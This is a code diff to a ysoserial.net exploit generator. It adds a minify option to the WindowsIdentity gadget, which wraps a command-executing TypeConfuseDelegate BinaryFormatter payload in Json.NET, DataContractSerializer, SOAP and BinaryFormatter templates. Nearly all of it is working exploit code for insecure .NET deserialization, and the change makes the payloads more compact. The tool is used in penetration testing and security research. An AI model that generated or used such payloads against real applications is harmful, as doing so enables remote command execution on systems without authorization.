@@ -66,16 +66,16 @@ namespace ysoserial.Generators
             }
         }
 
-        public override object Generate(string cmd, string formatter, Boolean test)
+        public override object Generate(string cmd, string formatter, Boolean test, Boolean minify)
         {
             Generator binaryFormatterGenerator = new TypeConfuseDelegateGenerator();
-            byte[] binaryFormatterPayload = (byte[])binaryFormatterGenerator.Generate(cmd, "BinaryFormatter", false);
+            byte[] binaryFormatterPayload = (byte[])binaryFormatterGenerator.Generate(cmd, "BinaryFormatter", false, minify);
             string b64encoded = Convert.ToBase64String(binaryFormatterPayload);
 
             if (formatter.Equals("binaryformatter", StringComparison.OrdinalIgnoreCase))
             {
                 var obj = new IdentityMarshal(b64encoded);
-                return Serialize(obj, formatter, test);
+                return Serialize(obj, formatter, test, minify);
             }
             else if (formatter.ToLower().Equals("json.net"))
             {
@@ -83,6 +83,11 @@ namespace ysoserial.Generators
                     '$type': 'System.Security.Principal.WindowsIdentity, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
                     'System.Security.ClaimsIdentity.actor': '" + b64encoded + @"'
                 }";
+
+                if (minify)
+                {
+                    payload = Helpers.JSONMinifier.Minify(payload, new string[] { "mscorlib" }, null);
+                }
 
                 if (test)
                 {
@@ -101,12 +106,16 @@ namespace ysoserial.Generators
             }
             else if (formatter.ToLower().Equals("datacontractserializer"))
             {
-                string payload = $@"<root xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:xsd=""http://www.w3.org/2001/XMLSchema"" type=""System.Security.Principal.WindowsIdentity, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"">
+                string payload = $@"<root type=""System.Security.Principal.WindowsIdentity, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"">
     <WindowsIdentity xmlns:i=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:x=""http://www.w3.org/2001/XMLSchema"" xmlns=""http://schemas.datacontract.org/2004/07/System.Security.Principal"">
       <System.Security.ClaimsIdentity.actor i:type=""x:string"" xmlns="""">{b64encoded}</System.Security.ClaimsIdentity.actor>
        </WindowsIdentity>
 </root>
 ";
+                if (minify)
+                {
+                    payload = Helpers.XMLMinifier.Minify(payload, new string[] { "mscorlib" }, null);
+                }
 
                 if (test)
                 {
@@ -132,6 +141,10 @@ namespace ysoserial.Generators
 </w>
 </root>
 ";
+                if (minify)
+                {
+                    payload = Helpers.XMLMinifier.Minify(payload, new string[] { "mscorlib" }, null);
+                }
 
                 if (test)
                 {
@@ -159,6 +172,10 @@ namespace ysoserial.Generators
 </SOAP-ENV:Body>
 </SOAP-ENV:Envelope>
 ";
+                if (minify)
+                {
+                    payload = Helpers.XMLMinifier.Minify(payload, new string[] { "mscorlib" }, null, Helpers.FormatterType.SoapFormatter);
+                }
 
                 if (test)
                 {
